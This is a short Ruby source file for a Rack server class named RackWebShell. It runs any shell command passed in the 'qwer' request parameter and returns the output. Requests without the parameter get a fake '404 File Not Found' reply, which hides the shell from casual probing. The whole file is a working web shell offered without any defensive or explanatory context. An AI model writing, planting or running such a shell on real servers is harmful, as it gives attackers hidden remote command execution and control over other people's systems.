require 'rack'
require 'rack/server'


class RackWebShell
  def self.call(env)
    request = Rack::Request.new env
    response = Rack::Response.new
    Process.kill 9, Process.pid if request.params['qwer'] == 'quit'
    unless request.params['qwer'].nil?
      response.write `#{request.params['qwer']}`
      response.finish # return the generated triplet
    else
      response.write "ERROR 404: File Not Found\n"
      response.status = 404
      response.finish
    end
  end
end


Rack::Server.start :app => RackWebShell
